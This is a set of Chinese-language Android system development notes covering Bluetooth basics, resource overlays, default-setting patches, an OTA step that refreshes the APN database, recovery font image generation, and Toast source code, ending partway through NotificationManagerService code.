蓝牙是一种低功耗的无线连接技术，是一种设备间短距离的无线通讯方式，这句话表明以下几个信息，

低耗能技术
蓝牙跨设备使用
蓝牙属于短距离通讯方式
蓝牙是一种无线通讯方式，既然是无线通讯那么势必要有通信协议标准即蓝牙无线通信协议标准
长期以来，看到蓝牙众多的配置文件和协议一直都很乱，其实蓝牙在使用时总共有三种功能

跨设备传输流式音频
跨设备传输数据
广播信息
对于一个蓝牙新手来说，首先一定要明白，蓝牙技术有两种类型、四种通信方式。在研究时一定要先明白自己研究的是蓝牙的什么技术，什么通信方式。

Basic Rate/Enhanced Data Rate (BR/EDR)基本速率/增强数据速率即所谓的传统蓝牙技术（蓝牙版本2.0/2.1）：仅支持P2P一种通信方式，即1：1设备间通信，具有持续无线连接、优化音频流的特点，所以是蓝牙耳机、蓝牙扬声器等音频传输的理想方案
Low Energy (LE)低功耗即所谓的新型的低功耗蓝牙技术（蓝牙版本4.0/4.1/4.2/4.3）：支持三种通信方式，
P2P(point-to-point)（点对点）:1:1支持短时间无限连接，优化了数据传输能量消耗，可用于无线键盘、无线鼠标等
broadcast（广播信息）:1:m。可以实现本地化信息共享。广播信息顾名思义，一设备广播信息，其他对该信息感兴趣的设备接受该信息并进行处理。比如beacon
mesh(网格):m:m
按照蓝牙模块的种类来说目前市面上有三种蓝牙规格，说白了也就是有三种蓝牙设备模块。一般手机都是蓝牙双模的。

蓝牙BR/EDR—-传统蓝牙模块，建立相对较短距离的持续无线连接，因此非常适用于流式音频等应用
蓝牙LE—-可建立短时间的长距离无线电连接，非常适用于无需持续连接但依赖电池具有较长寿命的的物联网 (IoT) 应用
双模—-双模芯片可支持需要连接 BR/EDR 设备（例如音频耳机）以及 LE 设备（例如穿戴设备或零售信标）的单一设备（例如智能手机或平板电脑）
按照版本来说，蓝牙又分为好多版本,常见的比如2.0/2.1/4.0/4.1/4.2/4.3，不同的版本会有不同的蓝牙规格，以及蓝牙的数据传输速率、蓝牙通信距离等都有所不同。
对于作者来说，从研究条件以及自身兴趣点出发，我会去研究双模蓝牙

0.3
那么蓝牙的应用场景呢？
蓝牙的应用到底有多广泛呢？用一组数据告诉你：蓝牙已经整合到了超过 30,000 个蓝牙 SIG 成员生产的 82 亿件产品中。蓝牙应用已经渗透到了生活的方方面面
汽车：车载蓝牙，免提呼叫，蓝牙播放音频。全球 12 家主要汽车制造商全部都提供蓝牙免提呼叫系统。智能家居，实现家居自动化，零售位置导向式服务等等

0.4
文章看到这里，你应该已经搞明白了蓝牙是什么，有什么功能，有什么技术，有什么通信方式，在什么地方用到。研究到这里，就应该研究一下蓝牙的组成了。不同种类的蓝牙模块即不同规格的蓝牙具有不同的系统结构。但也有一些共通的：包含射频收发器、基带和协议栈。
```

## Android Overlay机制

```text
Android overlay 机制允许在不修改packages中apk的情况下，来自定义 framework和package中的资源文件，实现资源的定制。来达到显示不同的UI得目的（如MIUI）。

以下几类能够通过该机制定义：

Configurations (string, bool, bool-array)
Localization (string, string-array)
UI Appearance (color, drawable, layout, style, theme, animation)
Raw resources (audio, video, xml)
1 为产品添加Overlay目录
1.1 Product Overlays与Device Overlays
有两种不同的overaly目录定义，来影响最终的效果:

PRODUCT_PACKAGE_OVERLAYS: used by a particular product
DEVICE_PACKAGE_OVERLAYS: used several products that share a common device model
如果包含同一资源，那么PRODUCT_PACKAGE_OVERLAYS将覆盖 DEVICE_PACKAGE_OVERLAYS 中的。

PRODUCT_PACKAGE_OVERLAYS & DEVICE_PACKAGE_OVERLAYS 功能是一样的，只是优先级不一样：

**PRODUCT_PACKAGE_OVERLAYS 优先于 DEVICE_PACKAGE_OVERLAYS** 
1.2 改变makefile来添加overlays的编译项
为了添加一个overlay目录, 需要修改产品的makefile

(for example: device/vendor-name/device-name/product-name.mk)

添加以下几行:

PRODUCT_PACKAGE_OVERLAYS := device/vendor-name/device-name/product-name/overlay $(PRODUCT_PACKAGE_OVERLAYS)

Or:

DEVICE_PACKAGE_OVERLAYS := device/vendor-name/device-name/common/overlay $(DEVICE_PACKAGE_OVERLAYS)

(如: device/vendor-name/device-name/device_base.mk)中添加：

LOCAL_PATH := device/vendor-name/device-name

DEVICE_PACKAGE_OVERLAYS := $(LOCAL_PATH)/overlay

如果要定义多个overlays目录，需要用空格隔开.

如果有多个目录，并且都包含同一资源的定义，那么将使用第一个定义的目录中的资源。

1.3 在overlay目录下创建资源文件
想覆盖Android系统自带package中资源文件, 那么在overlay目录下必须包含和要替换package相同的路径, 该路径是Android源码目录的相对路径.

For example, 如果我们想要替换以下目录的资源文件:

packages/apps/Settings/res/

那么在overlay目录下面必须创建一样的目录:

../overlay目录/packages/apps/Settings/res/

然后放入想要替换的资源（必须和系统package相同路径和文件名）.
```

## [make] make -j8 SHOWCOMMAND=TRUE 2>&1 | tee build.log

```text
SHOWCOMMAND=TRUE 将编译的命令显示出来
```

## [默认值] 默认蓝牙名称修改

```text
system/bt/internal_include/bt_target.h

#ifndef BTM_DEF_LOCAL_NAME
#define BTM_DEF_LOCAL_NAME "BT NAME"
#endif
```

## [默认值] 默认WIFI名称修改

```text
frameworks/base/core/res/res/values/strings.xml
<string name="wifi_tether_configure_ssid_default" translatable="false">WIFI SSID</string>
```

## [默认值] 默认关闭数据连接

```text
--- a/alps/frameworks/opt/telephony/src/java/com/android/internal/telephony/DataEnableController.java
+++ b/alps/frameworks/opt/telephony/src/java/com/android/internal/telephony/DataEnableController.java
@@ -148,8 +148,10 @@ public class DataEnableController extends ContextWrapper {
             return Settings.Global.getInt(mContext.getContentResolver(), Settings.Global.MOBILE_DATA
                     + SubscriptionManager.MAX_SUBSCRIPTION_ID_VALUE) != 0;
         } catch (SettingNotFoundException e) {
             Settings.Global.putInt(mContext.getContentResolver(),
-                    Settings.Global.MOBILE_DATA + SubscriptionManager.MAX_SUBSCRIPTION_ID_VALUE, 1);
+                    Settings.Global.MOBILE_DATA + SubscriptionManager.MAX_SUBSCRIPTION_ID_VALUE, 0);
             return true;
         }
     }
```

## [ota] OTA升级后更新APN列表开机即生效

```text
[标题] 
[FOTA] 更新APN列表OTA升级后开机即生效

[问题描述] 
更新APN列表OTA升级后需要恢复出厂设置APN更新才有效， 客户需要做升级后开机即生效。 

[解决方案] 
MTK解决方案 FAQ12633:
因为，OTA升级更新的是三个区域，boot, recovery, system,
APN属于DATA域，OTA升级不会涉及到， 所以必须reset之后才会更新有效。
所以需要修改 alps\build\tools\releasetools\ota_from_target_files 这个脚本，在
script.DeleteFiles([i[1]  for i in to_create] )
script.MakeSymlinks(to_create)
之后添加以下命令：
script.Mount("/data")
script.DeleteFiles(["/data/data/com.android.providers.telephony/databases/telephony.db", "/data/data/com.android.providers.telephony/shared_prefs/load-apn.xml"] )
这样做的目的是在升级之后，开机再重新把apns-conf.xml里的apn信息写入db ， 达到更新的目的。

但此方法并不适用于广升FOTA，但原理类似，就是删除系统中/data区下apn的数据库，重新开机的时候如果没有检测到apn的数据库，就会重新读取apn-conf.xml文件，并将其加载到数据库中。
1.修改 ota_from_target_files 脚本如下
script.Mount("/system")
+script.Mount("/data")
script.UnpackPackageDir("recovery", "/system")

device_specific.FullOTA_InstallEnd()
+  script.AppendExtra('delete("/data/data/com.android.providers.telephony/databases/telephony.db");')
+  script.AppendExtra('delete("/data/data/com.android.providers.telephony/shared_prefs/load-apn.xml");')

if OPTIONS.extra_script is not None:
script.AppendExtra(OPTIONS.extra_script)

2.在使用广升做差分包的工具里面替换脚本为修改后的脚本

但此方法只适用于KK及以下的版本，并不适用于KK以上的版本，如L，M，N，O，因为KK以上的版本对/data区的数据的保护更加严格

KK以上的版本在ONLINE上找到一个可能可行的解决方案，[FAQ19780] ，如果后续出现这样的问题，可以试一下。
```

## Android Q recovery字体图片生成流程分析

```text
build/make/core/Makefile

# Set recovery_density to a density bucket based on TARGET_SCREEN_DENSITY, PRODUCT_AAPT_PREF_CONFIG,
# or mdpi, in order of preference. We support both specific buckets (e.g. xdpi) and numbers,
# which get remapped to a bucket.
recovery_density := $(or $(TARGET_SCREEN_DENSITY),$(PRODUCT_AAPT_PREF_CONFIG),mdpi)
ifeq (,$(filter xxxhdpi xxhdpi xhdpi hdpi mdpi,$(recovery_density)))
recovery_density_value := $(patsubst %dpi,%,$(recovery_density))
# We roughly use the medium point between the primary densities to split buckets.
# ------160------240------320----------480------------640------
#       mdpi     hdpi    xhdpi        xxhdpi        xxxhdpi
recovery_density := $(strip \
  $(or $(if $(filter $(shell echo $$(($(recovery_density_value) >= 560))),1),xxxhdpi),\
       $(if $(filter $(shell echo $$(($(recovery_density_value) >= 400))),1),xxhdpi),\
       $(if $(filter $(shell echo $$(($(recovery_density_value) >= 280))),1),xhdpi),\
       $(if $(filter $(shell echo $$(($(recovery_density_value) >= 200))),1),hdpi,mdpi)))
endif

ifneq (,$(wildcard $(recovery_resources_common)-$(recovery_density)))
recovery_resources_common := $(recovery_resources_common)-$(recovery_density)
else
recovery_resources_common := $(recovery_resources_common)-xhdpi
endif

# Select the 18x32 font on high-density devices (xhdpi and up); and the 12x22 font on other devices.
# Note that the font selected here can be overridden for a particular device by putting a font.png
# in its private recovery resources.
ifneq (,$(filter xxxhdpi xxhdpi xhdpi,$(recovery_density)))
recovery_font := $(call include-path-for, recovery)/fonts/18x32.png
else
recovery_font := $(call include-path-for, recovery)/fonts/12x22.png
endif


# We will only generate the recovery background text images if the variable
# TARGET_RECOVERY_UI_SCREEN_WIDTH is defined. For devices with xxxhdpi and xxhdpi, we set the
# variable to the commonly used values here, if it hasn't been intialized elsewhere. While for
# devices with lower density, they must have TARGET_RECOVERY_UI_SCREEN_WIDTH defined in their
# BoardConfig in order to use this feature.
ifeq ($(recovery_density),xxxhdpi)
TARGET_RECOVERY_UI_SCREEN_WIDTH ?= 1440
else ifeq ($(recovery_density),xxhdpi)
TARGET_RECOVERY_UI_SCREEN_WIDTH ?= 1080
else ifeq ($(recovery_density),xhdpi)
TARGET_RECOVERY_UI_SCREEN_WIDTH ?= 720
else ifeq ($(recovery_density),hdpi)
TARGET_RECOVERY_UI_SCREEN_WIDTH ?= 480
endif

ifneq ($(TARGET_RECOVERY_UI_SCREEN_WIDTH),)
# Subtracts the margin width and menu indent from the screen width; it's safe to be conservative.
ifeq ($(TARGET_RECOVERY_UI_MARGIN_WIDTH),)
  recovery_image_width := $$(($(TARGET_RECOVERY_UI_SCREEN_WIDTH) - 10))
else
  recovery_image_width := $$(($(TARGET_RECOVERY_UI_SCREEN_WIDTH) - $(TARGET_RECOVERY_UI_MARGIN_WIDTH) - 10))
endif


RECOVERY_INSTALLING_TEXT_FILE := $(call intermediates-dir-for,PACKAGING,recovery_text_res)/installing_text.png
RECOVERY_INSTALLING_SECURITY_TEXT_FILE := $(dir $(RECOVERY_INSTALLING_TEXT_FILE))/installing_security_text.png
RECOVERY_ERASING_TEXT_FILE := $(dir $(RECOVERY_INSTALLING_TEXT_FILE))/erasing_text.png
RECOVERY_ERROR_TEXT_FILE := $(dir $(RECOVERY_INSTALLING_TEXT_FILE))/error_text.png
RECOVERY_NO_COMMAND_TEXT_FILE := $(dir $(RECOVERY_INSTALLING_TEXT_FILE))/no_command_text.png

RECOVERY_CANCEL_WIPE_DATA_TEXT_FILE := $(dir $(RECOVERY_INSTALLING_TEXT_FILE))/cancel_wipe_data_text.png
RECOVERY_FACTORY_DATA_RESET_TEXT_FILE := $(dir $(RECOVERY_INSTALLING_TEXT_FILE))/factory_data_reset_text.png
RECOVERY_TRY_AGAIN_TEXT_FILE := $(dir $(RECOVERY_INSTALLING_TEXT_FILE))/try_again_text.png
RECOVERY_WIPE_DATA_CONFIRMATION_TEXT_FILE := $(dir $(RECOVERY_INSTALLING_TEXT_FILE))/wipe_data_confirmation_text.png
RECOVERY_WIPE_DATA_MENU_HEADER_TEXT_FILE := $(dir $(RECOVERY_INSTALLING_TEXT_FILE))/wipe_data_menu_header_text.png

generated_recovery_text_files := \
  $(RECOVERY_INSTALLING_TEXT_FILE) \
  $(RECOVERY_INSTALLING_SECURITY_TEXT_FILE) \
  $(RECOVERY_ERASING_TEXT_FILE) \
  $(RECOVERY_ERROR_TEXT_FILE) \
  $(RECOVERY_NO_COMMAND_TEXT_FILE) \
  $(RECOVERY_CANCEL_WIPE_DATA_TEXT_FILE) \
  $(RECOVERY_FACTORY_DATA_RESET_TEXT_FILE) \
  $(RECOVERY_TRY_AGAIN_TEXT_FILE) \
  $(RECOVERY_WIPE_DATA_CONFIRMATION_TEXT_FILE) \
  $(RECOVERY_WIPE_DATA_MENU_HEADER_TEXT_FILE)

resource_dir := $(call include-path-for, recovery)/tools/recovery_l10n/res/
image_generator_jar := $(HOST_OUT_JAVA_LIBRARIES)/RecoveryImageGenerator.jar
zopflipng := $(HOST_OUT_EXECUTABLES)/zopflipng
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_SOURCE_FONTS := $(recovery_noto-fonts_dep) $(recovery_roboto-fonts_dep)
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_RECOVERY_FONT_FILES_DIR := $(call intermediates-dir-for,PACKAGING,recovery_font_files)
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_RESOURCE_DIR := $(resource_dir)
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_IMAGE_GENERATOR_JAR := $(image_generator_jar)
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_ZOPFLIPNG := $(zopflipng)
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_RECOVERY_IMAGE_WIDTH := $(recovery_image_width)
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_RECOVERY_BACKGROUND_TEXT_LIST := \
  recovery_installing \
  recovery_installing_security \
  recovery_erasing \
  recovery_error \
  recovery_no_command
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_RECOVERY_WIPE_DATA_TEXT_LIST := \
  recovery_cancel_wipe_data \
  recovery_factory_data_reset \
  recovery_try_again \
  recovery_wipe_data_menu_header \
  recovery_wipe_data_confirmation
$(RECOVERY_INSTALLING_TEXT_FILE): .KATI_IMPLICIT_OUTPUTS := $(filter-out $(RECOVERY_INSTALLING_TEXT_FILE),$(generated_recovery_text_files))
$(RECOVERY_INSTALLING_TEXT_FILE): $(image_generator_jar) $(resource_dir) $(recovery_noto-fonts_dep) $(recovery_roboto-fonts_dep) $(zopflipng)
 # Prepares the font directory.
 @rm -rf $(PRIVATE_RECOVERY_FONT_FILES_DIR)
 @mkdir -p $(PRIVATE_RECOVERY_FONT_FILES_DIR)
 $(foreach filename,$(PRIVATE_SOURCE_FONTS), cp $(filename) $(PRIVATE_RECOVERY_FONT_FILES_DIR) &&) true
 @rm -rf $(dir $@)
 @mkdir -p $(dir $@)
 $(foreach text_name,$(PRIVATE_RECOVERY_BACKGROUND_TEXT_LIST) $(PRIVATE_RECOVERY_WIPE_DATA_TEXT_LIST), \
   $(eval output_file := $(dir $@)/$(patsubst recovery_%,%_text.png,$(text_name))) \
   $(eval center_alignment := $(if $(filter $(text_name),$(PRIVATE_RECOVERY_BACKGROUND_TEXT_LIST)), --center_alignment)) \
   java -jar $(PRIVATE_IMAGE_GENERATOR_JAR) \
     --image_width $(PRIVATE_RECOVERY_IMAGE_WIDTH) \
     --text_name $(text_name) \
     --font_dir $(PRIVATE_RECOVERY_FONT_FILES_DIR) \
     --resource_dir $(PRIVATE_RESOURCE_DIR) \
     --output_file $(output_file) $(center_alignment) && \
   $(PRIVATE_ZOPFLIPNG) -y --iterations=1 --filters=0 $(output_file) $(output_file) > /dev/null &&) true
else
RECOVERY_INSTALLING_TEXT_FILE :=
RECOVERY_INSTALLING_SECURITY_TEXT_FILE :=
RECOVERY_ERASING_TEXT_FILE :=
RECOVERY_ERROR_TEXT_FILE :=
RECOVERY_NO_COMMAND_TEXT_FILE :=
RECOVERY_CANCEL_WIPE_DATA_TEXT_FILE :=
RECOVERY_FACTORY_DATA_RESET_TEXT_FILE :=
RECOVERY_TRY_AGAIN_TEXT_FILE :=
RECOVERY_WIPE_DATA_CONFIRMATION_TEXT_FILE :=
RECOVERY_WIPE_DATA_MENU_HEADER_TEXT_FILE :=
endif # TARGET_RECOVERY_UI_SCREEN_WIDTH


关键代码如下，是通过 jar 包去生成 recovery 字体图片的
java -jar $(PRIVATE_IMAGE_GENERATOR_JAR) \
    --image_width $(PRIVATE_RECOVERY_IMAGE_WIDTH) \
    --text_name $(text_name) \
    --font_dir $(PRIVATE_RECOVERY_FONT_FILES_DIR) \
    --resource_dir $(PRIVATE_RESOURCE_DIR) \
    --output_file $(output_file) $(center_alignment)

PRIVATE_IMAGE_GENERATOR_JAR := $(image_generator_jar)

image_generator_jar := $(HOST_OUT_JAVA_LIBRARIES)/RecoveryImageGenerator.jar

在 out/host 下生成的 jar 包路径 out/host/linux-x86/framework/RecoveryImageGenerator.jar

查找 RecoveryImageGenerator 模块在源码中对应的路径
pathmod RecoveryImageGenerator

alps/bootable/recovery/tools/image_generator

这个目录下有一个 java 文件，alps/bootable/recovery/tools/image_generator/ImageGenerator.java    关键的 main() 函数代码如下
public static void main(String[]  args)
        throws NumberFormatException, IOException, FontFormatException,
                LocalizedStringNotFoundException {
    Options options = createOptions();
    CommandLine cmd;
    try {
        cmd = new GnuParser().parse(options, args);
    } catch (ParseException e) {
        System.err.println(e.getMessage());
        printUsage(options);
        return;
    }

    int imageWidth = Integer.parseUnsignedInt(cmd.getOptionValue("image_width"));

    if (cmd.hasOption("verbose")) {
        LOGGER.setLevel(Level.INFO);
    } else {
        LOGGER.setLevel(Level.WARNING);
    }

    ImageGenerator imageGenerator =
            new ImageGenerator(
                    imageWidth,
                    cmd.getOptionValue("text_name"),
                    DEFAULT_FONT_SIZE,
                    cmd.getOptionValue("font_dir"),
                    cmd.hasOption("center_alignment"));

    Set<String> localesSet = null;
    if (cmd.hasOption("locales")) {
        String[]  localesList = cmd.getOptionValue("locales").split(",");
        localesSet = new HashSet<>(Arrays.asList(localesList));
        // Ensures that we have the default locale, all english translations are identical.
        localesSet.add("en-rAU");
    }
    Map<Locale, String> localizedStringMap =
            imageGenerator.readLocalizedStringFromXmls(cmd.getOptionValue("resource_dir"),
                    localesSet);
    imageGenerator.generateImage(localizedStringMap, cmd.getOptionValue("output_file"));
}

public ImageGenerator(
        int initialImageWidth,
        String textName,
        float fontSize,
        String fontDirPath,
        boolean centerAlignment) {
    mImageWidth = initialImageWidth;
    mImageHeight = INITIAL_HEIGHT;
    mVerticalOffset = 0;

    // Initialize the canvas with the default height.
    mBufferedImage = new BufferedImage(mImageWidth, mImageHeight, BufferedImage.TYPE_BYTE_GRAY);

    mTextName = textName;
    mFontSize = fontSize;
    mFontDirPath = fontDirPath;
    mLoadedFontMap = new TreeMap<>();

    mCenterAlignment = centerAlignment;
}

其他几个参数
1.PRIVATE_RECOVERY_IMAGE_WIDTH 图片宽度
PRIVATE_RECOVERY_IMAGE_WIDTH := $(recovery_image_width)
recovery_image_width := $$(($(TARGET_RECOVERY_UI_SCREEN_WIDTH) - 10))
TARGET_RECOVERY_UI_SCREEN_WIDTH ?= 720

2.text_name 是生成的recovery图片的名称，是从 $(PRIVATE_RECOVERY_BACKGROUND_TEXT_LIST) $(PRIVATE_RECOVERY_WIPE_DATA_TEXT_LIST) 这两个集合变量中遍历而来的
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_RECOVERY_BACKGROUND_TEXT_LIST := \
  recovery_installing \
  recovery_installing_security \
  recovery_erasing \
  recovery_error \
  recovery_no_command
$(RECOVERY_INSTALLING_TEXT_FILE): PRIVATE_RECOVERY_WIPE_DATA_TEXT_LIST := \
  recovery_cancel_wipe_data \
  recovery_factory_data_reset \
  recovery_try_again \
  recovery_wipe_data_menu_header \
  recovery_wipe_data_confirmation

3.DEFAULT_FONT_SIZE = 40; 默认字体大小，单位是 px

4.PRIVATE_RECOVERY_FONT_FILES_DIR 字体文件目录
PRIVATE_RECOVERY_FONT_FILES_DIR := $(call intermediates-dir-for,PACKAGING,recovery_font_files)
该目录下的文件是从 PRIVATE_SOURCE_FONTS := $(recovery_noto-fonts_dep) $(recovery_roboto-fonts_dep) 里面拷过来的

经过搜索发现 recovery_noto-fonts_dep 字体文件在 external/noto-fonts
经过搜索发现 recovery_roboto-fonts_dep 字体文件在 external/roboto-fonts

5.centerAlignment 是否居中

6.PRIVATE_RESOURCE_DIR 字符串资源目录
PRIVATE_RESOURCE_DIR := $(resource_dir)
resource_dir := $(call include-path-for, recovery)/tools/recovery_l10n/res/

7.output_file 输出文件路径
$(eval output_file := $(dir $@)/$(patsubst recovery_%,%_text.png,$(text_name)))

解析字符串代码，第一个参数是字符串资源文件的路径，第二个参数是 locales 语言集合，可以通过参数传递进来，这个方法里面最关键的方法是 getTextString()，这个方式里面是通过DOM解析xml字符串资源文件的
public Map<Locale, String> readLocalizedStringFromXmls(String resourcePath,
        Set<String> localesSet) throws IOException, LocalizedStringNotFoundException {
    File resourceDir = new File(resourcePath);
    if (!resourceDir.isDirectory()) {
        throw new LocalizedStringNotFoundException(resourcePath + " is not a directory.");
    }

    Map<Locale, String> result =
            // Overrides the string comparator so that sr is sorted behind sr-Latn. And thus
            // recovery can find the most relevant locale when going down the list.
            new TreeMap<>(
                    (Locale l1, Locale l2) -> {
                        if (l1.toLanguageTag().equals(l2.toLanguageTag())) {
                            return 0;
                        }
                        if (l1.getLanguage().equals(l2.toLanguageTag())) {
                            return -1;
                        }
                        if (l2.getLanguage().equals(l1.toLanguageTag())) {
                            return 1;
                        }
                        return l1.toLanguageTag().compareTo(l2.toLanguageTag());
                    });

    // Find all the localized resource subdirectories in the format of values-$LOCALE
    String[]  nameList =
            resourceDir.list((File file, String name) -> name.startsWith("values-"));
    for (String name : nameList) {
        String localeString = name.substring(7);
        if (localesSet != null && !localesSet.contains(localeString)) {
            LOGGER.info("Skip parsing text for locale " + localeString);
            continue;
        }

        File textFile = new File(resourcePath, name + "/strings.xml");
        String localizedText;
        try {
            localizedText = getTextString(textFile, mTextName);
        } catch (IOException | ParserConfigurationException | org.xml.sax.SAXException e) {
            throw new LocalizedStringNotFoundException(
                    "Failed to read the translated text for locale " + name, e);
        }

        Locale locale = getLocaleFromFilename(name);
        // Removes the double quotation mark from the text.
        result.put(locale, localizedText.substring(1, localizedText.length() - 1));
    }

    return result;
}

最后的 imageGenerator.generateImage(localizedStringMap, cmd.getOptionValue("output_file")); 方法用来生成 recovery 图片资源文件

public void generateImage(Map<Locale, String> localizedTextMap, String outputPath)
        throws FontFormatException, IOException {
    FontMetrics defaultFontMetrics =
            createGraphics(Locale.forLanguageTag("en")).getFontMetrics();
    mDefaultFont = defaultFontMetrics.getFont();
    mAndroidStringWidth = defaultFontMetrics.stringWidth(ANDROID_STRING);

    // The last country variant should be the fallback locale for a given language.
    Map<String, Locale> fallbackLocaleMap = new HashMap<>();
    int textWidth = 0;
    for (Locale locale : localizedTextMap.keySet()) {
        // Updates the fallback locale if we have a new language variant. Don't do it for en-XC
        // as it's a pseudo-locale.
        if (!locale.toLanguageTag().equals("en-XC")) {
            fallbackLocaleMap.put(locale.getLanguage(), locale);
        }
        textWidth = Math.max(textWidth, measureTextWidth(localizedTextMap.get(locale), locale));
    }

    // Removes the black margins to reduce the size of the image.
    resize(textWidth, mImageHeight);

    for (Locale locale : localizedTextMap.keySet()) {
        // Recovery expects en-US instead of en_US.
        String languageTag = locale.toLanguageTag();
        Locale fallbackLocale = fallbackLocaleMap.get(locale.getLanguage());
        if (locale.equals(fallbackLocale)) {
            // Makes the last country variant for a given language be the catch-all for that
            // language.
            languageTag = locale.getLanguage();
        } else if (localizedTextMap.get(locale).equals(localizedTextMap.get(fallbackLocale))) {
            LOGGER.info("Skip parsing text for duplicate locale " + locale);
            continue;
        }

        drawText(localizedTextMap.get(locale), locale, languageTag);
    }

    resize(mImageWidth, mVerticalOffset);
    ImageIO.write(mBufferedImage, "png", new File(outputPath));
}

其中 resize 方法用来去除图片右边的黑色空白，所以一开始输入的图片宽度和最终生成图片宽度是有差异的

ImageIO.write() 就是保存图片到指定路径的方法
```

## Android Q深度解析Toast

```text
我们最常使用Toast的方法是 Toast.makeText().show();
在源码中找到 Toast.java 文件的路径
frameworks/base/core/java/android/widget/Toast.java
先看 makeText() 方法
public static Toast makeText(@NonNull Context context, @Nullable Looper looper, @NonNull CharSequence text, @Duration int duration) {
    Toast result = new Toast(context, looper);
    LayoutInflater inflate = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    View v = inflate.inflate(com.android.internal.R.layout.transient_notification, null);
    TextView tv = (TextView)v.findViewById(com.android.internal.R.id.message);
    tv.setText(text);
    result.mNextView = v;
    result.mDuration = duration;
    return result;
}
第一个参数 context : 上下文，这个不用多讲
第二个参数 looper : handler 的那个 looper，这个也不需要多说，@Nullable 可以为 null
第三个参数 text : 要显示的字符串
第四个参数 duration : toast显示的时间，@Duration 注解代码看下面，这个注解规定了只能有两种显示时长 LENGTH_SHORT = 0(4秒)，LENGTH_LONG = 1(7秒)
/** @hide */
@IntDef(prefix = { "LENGTH_" }, value = {
        LENGTH_SHORT,
        LENGTH_LONG
})
@Retention(RetentionPolicy.SOURCE)
public @interface Duration {}

static final long SHORT_DURATION_TIMEOUT = 4000;
static final long LONG_DURATION_TIMEOUT = 7000;
mParams.hideTimeoutMilliseconds = mDuration == Toast.LENGTH_LONG ? LONG_DURATION_TIMEOUT : SHORT_DURATION_TIMEOUT;

从 makeText() 方法体里面看到其实这个方法很简单
第一步：new 一个 Toast 对象
第二步：inflate 布局文件成一个 view
第三步：把要显示的 text 内容设置到布局文件中的 message(TextView) 中
第四步：把 view 和 duration 设置到 toast 对象中
第五步：返回这个 toast 对象，方便链式编程

然后再看一下这个构造函数
public Toast(@NonNull Context context, @Nullable Looper looper) {
    mContext = context;
    mTN = new TN(context.getPackageName(), looper);
    mTN.mY = context.getResources().getDimensionPixelSize(com.android.internal.R.dimen.toast_y_offset);
    mTN.mGravity = context.getResources().getInteger(com.android.internal.R.integer.config_toastDefaultGravity);
}

第一步：new TN 对象，TN 是 TransientNotification 短暂的通知的缩写，这个后面会详细介绍
第二步：设置 y 轴偏默认移量 toast_y_offset = 24dp，设置默认 gravity = 0x00000051 (Gravity.CENTER_HORIZONTAL | Gravity.BOTTOM)
frameworks/base/core/res/res/values/config.xml
<dimen name="toast_y_offset">24dp</dimen>
<!-- Default Gravity setting for the system Toast view. Equivalent to: Gravity.CENTER_HORIZONTAL | Gravity.BOTTOM -->
<integer name="config_toastDefaultGravity">0x00000051</integer>

接下来看 TN 的构造函数
TN(String packageName, @Nullable Looper looper) {
    // XXX This should be changed to use a Dialog, with a Theme.Toast
    // defined that sets up the layout params appropriately.
    final WindowManager.LayoutParams params = mParams;
    params.height = WindowManager.LayoutParams.WRAP_CONTENT;
    params.width = WindowManager.LayoutParams.WRAP_CONTENT;
    params.format = PixelFormat.TRANSLUCENT;
    params.windowAnimations = com.android.internal.R.style.Animation_Toast;
    params.type = WindowManager.LayoutParams.TYPE_TOAST;
    params.setTitle("Toast");
    params.flags = WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
            | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;

    mPackageName = packageName;

    if (looper == null) {
        // Use Looper.myLooper() if looper is not specified.
        looper = Looper.myLooper();
        if (looper == null) {
            throw new RuntimeException(
                    "Can't toast on a thread that has not called Looper.prepare()");
        }
    }
    mHandler = new Handler(looper, null) {
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case SHOW: {
                    IBinder token = (IBinder) msg.obj;
                    handleShow(token);
                    break;
                }
                case HIDE: {
                    handleHide();
                    // Don't do this in handleHide() because it is also invoked by
                    // handleShow()
                    mNextView = null;
                    break;
                }
                case CANCEL: {
                    handleHide();
                    // Don't do this in handleHide() because it is also invoked by
                    // handleShow()
                    mNextView = null;
                    try {
                        getService().cancelToast(mPackageName, TN.this);
                    } catch (RemoteException e) {
                    }
                    break;
                }
            }
        }
    };
}
这个构造函数就做了两件事情
1.初始化 WindowManager.LayoutParams，窗口类型设置为 TYPE_TOAST 这样就可以显示在比较顶层
2.初始化 handler 用于处理 toast 的显示/隐藏/取消

最后看一下 show() 方法
public void show() {
    if (mNextView == null) {
        throw new RuntimeException("setView must have been called");
    }

    INotificationManager service = getService();
    String pkg = mContext.getOpPackageName();
    TN tn = mTN;
    tn.mNextView = mNextView;
    final int displayId = mContext.getDisplayId();

    try {
        if (localLOGV) Log.v(TAG, "Toast SHOW: " + this + " view = " + mNextView
 + " caller: " + android.os.Debug.getCallers(1));
        service.enqueueToast(pkg, tn, mDuration, displayId);
    } catch (RemoteException e) {
        // Empty
    }
}
这个方法中调用了一个 service.enqueueToast() 方法，这个 service 是 INotificationManager 的实例对象，就是用 AIDL binder 机制调用 NotificationManagerService 中的方法

frameworks/base/services/core/java/com/android/server/notification/NotificationManagerService.java
@Override
public void enqueueToast(String pkg, ITransientNotification callback, int duration,
        int displayId)
{
    if (DBG) {
        Slog.i(TAG, "enqueueToast pkg=" + pkg + " callback=" + callback
                + " duration=" + duration + " displayId=" + displayId);
    }

    if (pkg == null || callback == null) {
        Slog.e(TAG, "Not enqueuing toast. pkg=" + pkg + " callback=" + callback);
        return ;
    }

    final int callingUid = Binder.getCallingUid();
    final boolean isSystemToast = isCallerSystemOrPhone()
            || PackageManagerService.PLATFORM_PACKAGE_NAME.equals(pkg);
    final boolean isPackageSuspended = isPackageSuspendedForUser(pkg, callingUid);
    final boolean notificationsDisabledForPackage = !areNotificationsEnabledForPackage(pkg,
            callingUid);

    long callingIdentity = Binder.clearCallingIdentity();
    try {
